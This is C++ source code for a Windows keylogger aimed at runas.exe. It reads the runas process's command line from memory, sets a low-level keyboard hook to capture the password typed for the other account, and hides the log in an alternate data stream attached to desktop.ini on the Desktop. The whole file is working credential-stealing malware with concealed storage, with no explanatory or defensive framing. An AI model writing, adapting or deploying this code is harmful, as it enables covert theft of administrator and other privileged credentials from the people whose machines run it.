#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <winternl.h>
#include <ShlObj.h>

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

char ADS_FILE_PATH[MAX_PATH];

char* globalBuffer = NULL;
size_t globalBufferSize = 0;
BOOL shouldLog = FALSE;
int lastPID = 0;

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

void InitializeADSPath() {
    char userPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, userPath))) {
        sprintf_s(ADS_FILE_PATH, sizeof(ADS_FILE_PATH), "%s\\desktop.ini:log", userPath);
    }
}


void WriteToADS(const char* data) {
    if (!data) return;

    char resolvedPath[MAX_PATH];
    if (!ExpandEnvironmentStringsA(ADS_FILE_PATH, resolvedPath, MAX_PATH)) {
        return;
    }

    HANDLE hFile = CreateFileA(
        resolvedPath,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, data, (DWORD)strlen(data), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

void appendToGlobalBuffer(const char* data) {
    if (!shouldLog || !data) return;

    size_t dataLen = strlen(data);
    if (dataLen == 0) return;

    size_t newSize = globalBufferSize + dataLen + 1;

    char* newBuffer = (char*)realloc(globalBuffer, newSize);
    if (newBuffer) {
        globalBuffer = newBuffer;
        if (globalBufferSize == 0) {
            strcpy_s(globalBuffer, newSize, data);
        }
        else {
            strcat_s(globalBuffer, newSize, data);
        }
        globalBufferSize = newSize;
        WriteToADS(data);
    }
}



void GetCommandLineByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) {
        fflush(stdout);
        return;
    }

    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        CloseHandle(hProcess);
        fflush(stdout);
        return;
    }

    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
        CloseHandle(hProcess);
        fflush(stdout);
        return;
    }

    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!ReadProcessMemory(hProcess, peb.ProcessParameters, &procParams, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
        CloseHandle(hProcess);
        fflush(stdout);
        return;
    }

    size_t bufferSize = (procParams.CommandLine.Length / sizeof(WCHAR)) + 2;
    WCHAR* commandLine = (WCHAR*)malloc(bufferSize * sizeof(WCHAR));
    if (!commandLine) {
        CloseHandle(hProcess);
        return;
    }

    if (!ReadProcessMemory(hProcess, procParams.CommandLine.Buffer, commandLine, procParams.CommandLine.Length, NULL)) {
        free(commandLine);
        CloseHandle(hProcess);
        return;
    }

    commandLine[procParams.CommandLine.Length / sizeof(WCHAR)] = L'\0';


    wcscat_s(commandLine, bufferSize, L"\n");

    size_t ansiBufferSize = bufferSize * 2;
    char* ansiCmdLine = (char*)malloc(ansiBufferSize);
    if (!ansiCmdLine) {
        free(commandLine);
        CloseHandle(hProcess);
        return;
    }

    wcstombs(ansiCmdLine, commandLine, ansiBufferSize);
    printf("1\n");

    WriteToADS(ansiCmdLine);
    printf("2\n");

    free(commandLine);
    free(ansiCmdLine);

    fflush(stdout);

    CloseHandle(hProcess);
}




DWORD IsProcessRunning(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return procId;
}


void keylogit(int vkCode, BOOL shiftPressed) {
    if (!shouldLog) return;

    BOOL isLetter = 1;
    char buffer[20] = { 0 };

    switch (vkCode) {
    case 0xA3: strcpy_s(buffer, sizeof(buffer), "<RCTRL>"); isLetter = 0; break;
    case 0xA4: strcpy_s(buffer, sizeof(buffer), "<LALT>"); isLetter = 0; break;
    case VK_CAPITAL: isLetter = 0; break;
    case 0x08: strcpy_s(buffer, sizeof(buffer), "<ESC>"); isLetter = 0; break;
    case 0x0D: strcpy_s(buffer, sizeof(buffer), "\n"); isLetter = 0; break;
    case VK_SPACE: strcpy_s(buffer, sizeof(buffer), " "); isLetter = 0; break;
    case VK_OEM_PLUS: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "+") : strcpy_s(buffer, sizeof(buffer), "="); isLetter = 0; break;
    case VK_OEM_COMMA: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "<") : strcpy_s(buffer, sizeof(buffer), ","); isLetter = 0; break;
    case VK_OEM_MINUS: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "_") : strcpy_s(buffer, sizeof(buffer), "-"); isLetter = 0; break;
    case VK_OEM_PERIOD: shiftPressed ? strcpy_s(buffer, sizeof(buffer), ">") : strcpy_s(buffer, sizeof(buffer), "."); isLetter = 0; break;
    case VK_OEM_1: shiftPressed ? strcpy_s(buffer, sizeof(buffer), ":") : strcpy_s(buffer, sizeof(buffer), ";"); isLetter = 0; break;
    case VK_OEM_2: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "?") : strcpy_s(buffer, sizeof(buffer), "/"); isLetter = 0; break;
    case VK_OEM_3: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "~") : strcpy_s(buffer, sizeof(buffer), ""); isLetter = 0; break;
    case VK_OEM_4: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "{") : strcpy_s(buffer, sizeof(buffer), "["); isLetter = 0; break;
    case VK_OEM_5: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "|") : strcpy_s(buffer, sizeof(buffer), "\\"); isLetter = 0; break;
    case VK_OEM_6: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "}") : strcpy_s(buffer, sizeof(buffer), "]"); isLetter = 0; break;
    case VK_OEM_7: shiftPressed ? strcpy_s(buffer, sizeof(buffer), "\"") : strcpy_s(buffer, sizeof(buffer), "'"); isLetter = 0; break;
    default: break;
    }

    if (isLetter) {
        BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (vkCode >= 0x41 && vkCode <= 0x5A) {
            if (capsLock ^ shiftPressed) {
                sprintf_s(buffer, sizeof(buffer), "%c", vkCode);
            }
            else {
                sprintf_s(buffer, sizeof(buffer), "%c", vkCode + 0x20);
            }
        }
        else if (vkCode >= 0x30 && vkCode <= 0x39) {
            if (shiftPressed) {
                const char* shiftNums[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                sprintf_s(buffer, sizeof(buffer), shiftNums[vkCode - '0']);
            }
            else {
                sprintf_s(buffer, sizeof(buffer), "%c", vkCode);
            }
        }
    }
    appendToGlobalBuffer(buffer);
    //printf("%s", buffer);

}

void MonitorProcess() {
    while (1) {
        DWORD pid = IsProcessRunning(L"runas.exe");
        shouldLog = (pid != 0);
        if (shouldLog) {
            GetCommandLineByPID(pid);
            lastPID = pid;
            return;
        }
        Sleep(2000);
    }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    InitializeADSPath();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcess, NULL, 0, NULL);

    if (IsProcessRunning(L"runas.exe")) shouldLog = TRUE;
    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
        if (nCode >= 0 && shouldLog) {
            PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
            int vkCode = kbdStruct->vkCode;
            BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                DWORD checkpid = IsProcessRunning(L"runas.exe");
                if (lastPID != checkpid) {
                    GetCommandLineByPID(checkpid);
                    lastPID = checkpid;
                    keylogit(vkCode, shiftPressed);
                }
                else if (IsProcessRunning(L"runas.exe")) {
                    keylogit(vkCode, shiftPressed);
                }
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }, 0, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kbdHook);
    return 0;
}
